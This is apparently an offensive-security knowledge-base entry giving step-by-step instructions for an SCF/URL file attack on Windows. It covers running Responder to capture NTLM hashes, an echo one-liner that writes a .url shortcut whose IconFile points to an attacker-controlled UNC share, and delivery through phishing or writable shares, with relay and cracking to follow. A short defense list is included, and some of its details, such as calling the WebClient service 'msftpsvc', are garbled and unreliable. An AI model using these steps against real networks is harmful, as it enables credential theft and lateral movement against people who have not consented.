---
type: procedure
tactics:
  - '[[Initial Access]]'
  - '[[Lateral Movement]]'
  - '[[Command and Control]]'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[Remote File Copy]]'
  - '[[Trusted Relationship]]'
sub_techniques: []
tags:
  - active-directory-attacks
  - scf-url-file-attack
  - writable-share-exploitation
  - ntlm-relay
commands:
  - '[[commands/responder-run-verbose-on-interface]]'
  - '[[commands/create-malicious-url-file]]'
tools:
  - '[[tools/Responder]]'
platforms:
  - Windows
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# SCF-URL-File-Attack-Against-Writable-Share

## Summary

This procedure demonstrates how to create a malicious URL shortcut file (.url) that triggers a victim's machine to authenticate to an attacker-controlled writable network share when the shortcut is opened. By setting the icon path to a UNC share hosted by the attacker, the victim's system fetches the icon, sending NTLM credentials that can be captured using tools like Responder for relay attacks, enabling initial access or lateral movement in Windows environments.

## Description

The SCF and URL file attack exploits Windows Explorer's behavior when rendering icons for shortcut files. An attacker crafts a .url file with an IconFile field pointing to a UNC path on a server they control (e.g., \\attacker_ip\share\%USERNAME%.icon). When a victim opens or views the shortcut—often by browsing a network share or clicking a phishing link—their machine attempts to load the icon from the UNC path, initiating an NTLM authentication attempt to the attacker's share. Responder can be used to poison LLMNR/NBT-NS queries or directly capture/relay these hashes for further exploitation, such as SMB access or pass-the-hash attacks. This technique is effective in Active Directory environments with writable shares and relies on social engineering to get the victim to interact with the file. It maps to drive-by compromises via trusted network relationships and remote file operations.

## Requirements

1. Attacker machine with a writable SMB share configured (e.g., using Samba or Windows file sharing).
2. Network access to the victim's domain or segment, allowing UNC path resolution.
3. Responder tool installed on the attacker machine for capturing NTLM hashes.
4. Victim using Windows with WebClient service enabled (default).
5. Ability to deliver the .url file to the victim (e.g., via email, shared folder, or phishing).

## Defense

- Disable the WebClient service (msftpsvc) on Windows systems to prevent automatic UNC icon fetching: `sc config webclient start= disabled`.
- Monitor SMB traffic for anomalous authentication attempts to internal shares using tools like Zeek or Windows Event Logs (Event ID 4624/4776).
- Implement SMB signing and restrict NTLM usage via Group Policy.
- Educate users to avoid opening unsolicited shortcuts or browsing untrusted network shares.
- Use AppLocker or WDAC to block execution of suspicious files.

## Objectives

1. Capture victim NTLM hashes for offline cracking or relay attacks.
2. Achieve initial access to the victim's network via credential theft.
3. Enable lateral movement by accessing other systems with relayed credentials.
4. Exfiltrate sensitive data from the victim's machine or domain.

## Instructions

### Step 1: Set Up Credential Capture with Responder

**Context**: Start Responder on the attacker machine to listen for NTLM authentication attempts triggered by the icon fetch. This poisons name resolution protocols like LLMNR and NBT-NS, allowing hash capture even if the UNC path uses a hostname.

**Command** ([[commands/responder-run-verbose-on-interface]]):
```bash
responder -I $_INTERFACE -v
```

> This command binds Responder to the specified network interface in verbose mode, displaying captured hashes and authentication details. Run it before delivering the .url file. Expected output includes listening messages like "[LLMNR] Poisoners started on interface" and hash captures like "[SMB] NTLMv2-SSP Hash: ::-..." when the victim authenticates.

### Step 2: Create the Malicious URL Shortcut File

**Context**: Generate the .url file content that points the icon to your writable share. The %USERNAME% variable ensures the share path is user-specific, often triggering automatic auth. Save this as a .url file and deliver it to the victim.

**Code** ([[codes/malicious-url-file-with-unc-icon]]):

> Use the code snippet to create the file via a text editor or command line. Replace placeholders like the UNC path with your share details (e.g., \\192.168.1.100\public\%USERNAME%.icon). The file mimics a legitimate shortcut but triggers the attack on open.

**Command** ([[commands/create-malicious-url-file]]):
```bash
echo '[InternetShortcut]\nURL=$_TARGET_URL\nWorkingDirectory=$_WORKING_DIR\nIconFile=$_UNC_PATH\nIconIndex=1' > $_OUTPUT_FILE.url
```

> This command outputs the .url file content using echo, substituting parameters for the legitimate URL, working directory, UNC icon path, and output filename. Verify the file by opening it in a text editor; it should contain the INI-formatted shortcut with the malicious IconFile. Expected output is the created .url file ready for delivery.

### Step 3: Host the Writable Share and Deliver the File

**Context**: Ensure your SMB share is accessible and monitor for connections. Deliver the .url file via phishing email, placing it on a network location the victim accesses, or tricking them into browsing a share containing it. When opened in Explorer, the icon fetch occurs.

**Instructions**: Configure a writable share on your machine (e.g., using `smb.conf` for Samba). Place an empty .icon file in the share if needed. Send the .url to the victim. Upon interaction, Responder should capture the hash.

> No specific command here, but monitor Responder output for success. Expected output: Captured NTLM hash in Responder logs, which can be cracked with Hashcat or relayed using tools like ntlmrelayx.py.
